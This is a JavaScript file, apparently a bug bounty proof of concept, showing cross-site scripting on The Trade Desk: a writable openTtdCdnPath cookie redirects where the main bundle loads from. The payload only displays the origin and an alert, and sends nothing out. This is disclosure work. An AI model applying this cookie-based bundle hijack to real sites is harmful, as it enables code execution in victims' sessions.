/* Bug bounty PoC - The Trade Desk (Bugcrowd). Benign: proves origin only.
   Reads nothing off-origin, sends nothing anywhere. */
(function () {
  var info = {
    origin: window.location.origin,
    domain: document.domain,
    loadedFrom: window.__dynamic_base__
  };

  console.log("[PoC] executing in origin:", info.origin);

  function paint() {
    document.title = "XSS PoC - " + info.domain;
    var d = document.createElement("div");
    d.setAttribute("style", [
      "position:fixed", "inset:0", "z-index:2147483647",
      "background:#0b0b0c", "color:#eaeaea",
      "font:16px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace",
      "padding:32px", "overflow:auto"
    ].join(";"));
    d.innerHTML =
      '<div style="max-width:780px">' +
      '<div style="font-size:30px;font-weight:700;color:#ff5f56;margin-bottom:6px">' +
      'Arbitrary JavaScript execution</div>' +
      '<div style="color:#9aa0a6;margin-bottom:24px">The Trade Desk - Bugcrowd PoC</div>' +
      '<div style="background:#141416;border-left:3px solid #ff5f56;padding:18px 20px;margin-bottom:22px">' +
      '<div>window.location.origin &nbsp;= <b style="color:#7ee787">' + info.origin + '</b></div>' +
      '<div>document.domain &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= <b style="color:#7ee787">' + info.domain + '</b></div>' +
      '<div>bundle loaded from = <b style="color:#ffa657">' + info.loadedFrom + '</b></div>' +
      '</div>' +
      '<div style="color:#9aa0a6">This script is the application&rsquo;s main bundle. It was' +
      ' fetched from an attacker-controlled origin because <code style="color:#eaeaea">openTtdCdnPath</code>,' +
      ' a cookie any <code style="color:#eaeaea">*.thetradedesk.com</code> host can write, decides' +
      ' where the bundle loads from. It runs with full access to this origin.</div>' +
      '</div>';
    document.body.appendChild(d);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", paint);
  } else {
    paint();
  }

  alert(
    "XSS PoC\n\n" +
    "origin: " + info.origin + "\n" +
    "document.domain: " + info.domain + "\n" +
    "loaded from: " + info.loadedFrom
  );
})();
